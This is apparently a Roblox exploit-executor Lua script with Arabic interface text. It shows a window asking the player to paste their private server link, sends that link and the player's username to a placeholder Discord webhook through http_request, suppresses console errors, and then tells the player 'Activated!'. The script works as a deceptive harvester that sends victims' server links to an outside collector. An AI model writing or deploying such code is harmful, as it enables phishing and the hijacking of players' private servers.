if not game:IsLoaded() then game.Loaded:Wait() end

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

if playerGui:FindFirstChild("ServerLinkUI") then
    playerGui.ServerLinkUI:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ServerLinkUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 280, 0, 130)
frame.Position = UDim2.new(0.5, -140, 0.5, -65)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
frame.BorderSizePixel = 0
frame.Parent = screenGui

-- عنوان
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 25)
title.BackgroundTransparency = 1
title.Text = "🌐 أرسل رابط سيرفرك"
title.TextColor3 = Color3.fromRGB(220, 220, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame

-- مربع الإدخال
local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 0, 30)
textBox.Position = UDim2.new(0, 10, 0, 35)
textBox.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.ClearTextOnFocus = false
textBox.PlaceholderText = "الصق رابط السيرفر هنا"
textBox.Font = Enum.Font.Gotham
textBox.TextSize = 14
textBox.Parent = frame

-- زر الإرسال
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 30)
sendButton.Position = UDim2.new(0, 10, 0, 80)
sendButton.BackgroundColor3 = Color3.fromRGB(60, 150, 200)
sendButton.Text = "إرسال"
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.Font = Enum.Font.GothamBold
sendButton.Parent = frame

-- ⚠️ ❗ غيّر هذا إلى webhook جديد من Discord ❗
local webhookUrl = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"

-- متغير لمنع الضغط المتكرر
local isSending = false

sendButton.MouseButton1Click:Connect(function()
    if isSending then return end
    local link = textBox.Text:trim()
    if link == "" then
        textBox.PlaceholderText = "الرابط فارغ!"
        return
    end

    isSending = true
    sendButton.Text = "يرسل..."
    sendButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)

    -- محاولة الإرسال (بدون إظهار أخطاء في الكونسول)
    spawn(function()
        local success = pcall(function()
            http_request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    content = "",
                    embeds = {{
                        title = "🎮 سيرفر جديد!",
                        description = "الرابط: " .. link,
                        color = 3066993,
                        footer = {text = "من: " .. player.Name}
                    }}
                })
            })
        end)

        -- عرض رسالة على الشاشة (بدون كونسول)
        if success then
            sendButton.Text = "✅ تم التفعيل!"
            sendButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
            wait(1.5)
            screenGui:Destroy()
        else
            sendButton.Text = "❌ حاول مرة أخرى"
            sendButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            wait(1.2)
            sendButton.Text = "إرسال"
            sendButton.BackgroundColor3 = Color3.fromRGB(60, 150, 200)
        end
        isSending = false
    end)
end)
